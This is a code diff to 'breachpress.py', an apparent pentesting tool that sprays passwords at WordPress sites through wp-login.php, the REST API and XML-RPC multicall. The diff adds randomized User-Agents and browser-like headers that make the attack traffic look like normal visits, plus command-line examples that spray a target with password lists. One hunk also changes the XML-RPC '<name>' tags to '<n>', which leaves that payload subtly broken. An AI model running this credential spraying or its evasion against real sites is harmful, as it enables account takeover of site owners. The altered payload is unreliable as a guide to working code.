@@ -15,6 +15,7 @@ from typing import List, Dict, Tuple, Optional
 import json
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import logging
+import random
 
 # Disable SSL warnings for pentesting
 requests.packages.urllib3.disable_warnings()
@@ -31,8 +32,36 @@ class Colors:
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
 
+# Default User-Agent if agents.txt is not found
+DEFAULT_USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+
+def load_user_agents(filepath: str = 'agents.txt') -> List[str]:
+    """
+    Load User-Agent strings from file
+    
+    Args:
+        filepath: Path to file containing User-Agent strings (one per line)
+        
+    Returns:
+        List of User-Agent strings
+    """
+    try:
+        with open(filepath, 'r') as f:
+            agents = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
+        if not agents:
+            print(f"{Colors.WARNING}[!] No User-Agents found in {filepath}, using default{Colors.ENDC}")
+            return [DEFAULT_USER_AGENT]
+        return agents
+    except FileNotFoundError:
+        print(f"{Colors.WARNING}[!] {filepath} not found, using default User-Agent{Colors.ENDC}")
+        return [DEFAULT_USER_AGENT]
+    except Exception as e:
+        print(f"{Colors.WARNING}[!] Error loading {filepath}: {e}, using default User-Agent{Colors.ENDC}")
+        return [DEFAULT_USER_AGENT]
+
 class WordPressSpray:
-    def __init__(self, target_url: str, timeout: int = 10, verify_ssl: bool = False, verbose: bool = False):
+    def __init__(self, target_url: str, timeout: int = 10, verify_ssl: bool = False, verbose: bool = False, 
+                 user_agent: Optional[str] = None, agents_file: str = 'agents.txt'):
         """
         Initialize the WordPress spray tool
         
@@ -41,6 +70,8 @@ class WordPressSpray:
             timeout: Request timeout in seconds
             verify_ssl: Whether to verify SSL certificates
             verbose: Enable verbose logging
+            user_agent: Custom User-Agent string (if None, uses random from file)
+            agents_file: Path to file containing User-Agent strings
         """
         self.target_url = target_url.rstrip('/')
         self.timeout = timeout
@@ -55,6 +86,19 @@ class WordPressSpray:
         )
         self.logger = logging.getLogger(__name__)
         
+        # Select User-Agent
+        if user_agent:
+            self.user_agent = user_agent
+            self.logger.info("Using custom User-Agent")
+        else:
+            # Load User-Agents from file and pick one randomly
+            user_agents = load_user_agents(agents_file)
+            self.user_agent = random.choice(user_agents)
+            self.logger.info(f"Loaded {len(user_agents)} User-Agent(s) from {agents_file}")
+        
+        if self.verbose:
+            print(f"{Colors.OKCYAN}[*] Selected User-Agent: {self.user_agent}{Colors.ENDC}")
+        
         # Attack surface tracking
         self.attack_surface = {
             'wp_login': False,
@@ -63,8 +107,17 @@ class WordPressSpray:
             'xmlrpc_multicall': False
         }
         
+        # Setup session with proper headers
         self.session = requests.Session()
         self.session.verify = verify_ssl
+        self.session.headers.update({
+            'User-Agent': self.user_agent,
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1'
+        })
         
     def print_banner(self):
         """Print tool banner"""
@@ -94,7 +147,7 @@ By: Michael @ Breach Craft
                 self.attack_surface['wp_login'] = True
                 print(f"{Colors.OKGREEN}[+] wp-login.php: Available{Colors.ENDC}")
             else:
-                print(f"{Colors.FAIL}[-] wp-login.php: Not found{Colors.ENDC}")
+                print(f"{Colors.FAIL}[-] wp-login.php: Not found (Status: {resp.status_code}){Colors.ENDC}")
         except Exception as e:
             self.logger.debug(f"wp-login.php check failed: {e}")
             print(f"{Colors.FAIL}[-] wp-login.php: Error checking{Colors.ENDC}")
@@ -107,7 +160,7 @@ By: Michael @ Breach Craft
                 self.attack_surface['rest_api'] = True
                 print(f"{Colors.OKGREEN}[+] REST API: Available{Colors.ENDC}")
             else:
-                print(f"{Colors.FAIL}[-] REST API: Not accessible{Colors.ENDC}")
+                print(f"{Colors.FAIL}[-] REST API: Not accessible (Status: {resp.status_code}){Colors.ENDC}")
         except Exception as e:
             self.logger.debug(f"REST API check failed: {e}")
             print(f"{Colors.FAIL}[-] REST API: Error checking{Colors.ENDC}")
@@ -138,7 +191,7 @@ By: Michael @ Breach Craft
                 else:
                     print(f"{Colors.WARNING}[!] XML-RPC system.multicall: Not available{Colors.ENDC}")
             else:
-                print(f"{Colors.FAIL}[-] XML-RPC: Not available{Colors.ENDC}")
+                print(f"{Colors.FAIL}[-] XML-RPC: Not available (Status: {resp.status_code}){Colors.ENDC}")
         except Exception as e:
             self.logger.debug(f"XML-RPC check failed: {e}")
             print(f"{Colors.FAIL}[-] XML-RPC: Error checking{Colors.ENDC}")
@@ -343,11 +396,11 @@ By: Michael @ Breach Craft
             <value>
               <struct>
                 <member>
-                  <name>methodName</name>
+                  <n>methodName</n>
                   <value><string>wp.getUsersBlogs</string></value>
                 </member>
                 <member>
-                  <name>params</name>
+                  <n>params</n>
                   <value>
                     <array>
                       <data>
@@ -483,7 +536,7 @@ def main():
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
-  # Enumerate attack surface and users only
+  # Enumerate attack surface and users only (uses random UA from agents.txt)
   python3 breachpress.py -u https://example.com --enumerate-only
   
   # Spray with userlist and passwordlist via best available method
@@ -494,6 +547,12 @@ Examples:
   
   # Enumerate users and spray in one go
   python3 breachpress.py -u https://example.com -P passwords.txt --auto-enum
+  
+  # Use custom User-Agent (bypasses agents.txt)
+  python3 breachpress.py -u https://example.com -P passwords.txt --auto-enum --user-agent "Custom UA"
+  
+  # Use custom agents file
+  python3 breachpress.py -u https://example.com -P passwords.txt --auto-enum --agents-file /path/to/agents.txt
         """
     )
     
@@ -516,6 +575,9 @@ Examples:
                        help='Request timeout in seconds (default: 10)')
     parser.add_argument('--no-ssl-verify', action='store_true',
                        help='Disable SSL certificate verification')
+    parser.add_argument('--user-agent', help='Custom User-Agent string (default: random from agents.txt)')
+    parser.add_argument('--agents-file', default='agents.txt',
+                       help='Path to file containing User-Agent strings (default: agents.txt)')
     parser.add_argument('-v', '--verbose', action='store_true',
                        help='Enable verbose output')
     parser.add_argument('-o', '--output', help='Output file for successful credentials')
@@ -527,7 +589,9 @@ Examples:
         target_url=args.url,
         timeout=args.timeout,
         verify_ssl=not args.no_ssl_verify,
-        verbose=args.verbose
+        verbose=args.verbose,
+        user_agent=args.user_agent,
+        agents_file=args.agents_file
     )
     
     spray.print_banner()
